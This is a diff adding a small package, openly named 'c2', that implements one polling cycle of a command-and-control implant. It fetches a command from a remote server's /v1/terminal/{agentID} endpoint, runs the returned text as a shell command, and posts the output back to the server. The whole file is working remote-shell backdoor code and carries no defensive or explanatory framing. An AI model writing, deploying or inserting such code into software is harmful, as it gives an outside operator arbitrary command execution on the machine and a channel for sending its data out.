@@ -1,0 +1,100 @@
+// Package c2 - terminal poll: GET command, shell, POST output.
+package c2
+
+import "std/runtime"
+import "std/net"
+import "std/process"
+import "std/strings"
+
+// terminalURL builds baseURL + "/v1/terminal/" + agentID (heap). Caller Free.
+fn terminalURL(baseURL: *u8, agentID: *u8) -> (*u8, *u8) {
+    if baseURL == null || agentID == null {
+        return null, "c2: null url"
+    }
+    var base: *u8 = baseURL
+    var n: u64 = __strlen(base)
+    // drop trailing slash on base
+    if n > 0 {
+        if *(base + n - 1) == 47 {
+            // copy without last slash
+            var raw: *void
+            var err0: *u8
+            raw, err0 = runtime.Alloc(n)
+            if err0 != 0 {
+                return null, err0
+            }
+            var b: *u8 = cast[*u8](raw)
+            var i: u64 = 0
+            while i < n - 1 {
+                *(b + i) = *(base + i)
+                i = i + 1
+            }
+            *(b + n - 1) = 0
+            mid, err1 := strings.Append(b, "/v1/terminal/")
+            runtime.Free(b)
+            if err1 != 0 {
+                return null, err1
+            }
+            defer runtime.Free(mid)
+            return strings.Append(mid, agentID)
+        }
+    }
+    mid2, err2 := strings.Append(base, "/v1/terminal/")
+    if err2 != 0 {
+        return null, err2
+    }
+    defer runtime.Free(mid2)
+    return strings.Append(mid2, agentID)
+}
+
+// PollTerminal performs one C2 cycle:
+//   GET  {base}/v1/terminal/{agentID}
+//   if 204 -> return success (no work)
+//   else run body as shell command, POST stdout to the same URL
+//
+// err == 0 means the cycle finished (including 204). Network/shell failures return err.
+fn PollTerminal(baseURL: *u8, agentID: *u8) -> *u8 {
+    url, err := terminalURL(baseURL, agentID)
+    if err != 0 {
+        return err
+    }
+    defer runtime.Free(url)
+
+    resp, err2 := net.Get(url)
+    if err2 != 0 {
+        return err2
+    }
+    defer net.FreeResponse(resp)
+
+    if resp.status == 204 {
+        return 0
+    }
+
+    // Any non-204 with a body is treated as a command line.
+    if resp.body == null {
+        return 0
+    }
+    if resp.bodyLen == 0 {
+        return 0
+    }
+
+    out, err3 := process.ShellOutput(resp.body)
+    if err3 != 0 {
+        return err3
+    }
+    defer free(out)
+
+    var body: *u8 = null
+    var blen: u64 = 0
+    if len(out) > 0 {
+        body = &out[0]
+        blen = len(out)
+    }
+
+    post, err4 := net.Post(url, "text/plain", body, blen)
+    if err4 != 0 {
+        return err4
+    }
+    net.FreeResponse(post)
+    return 0
+}
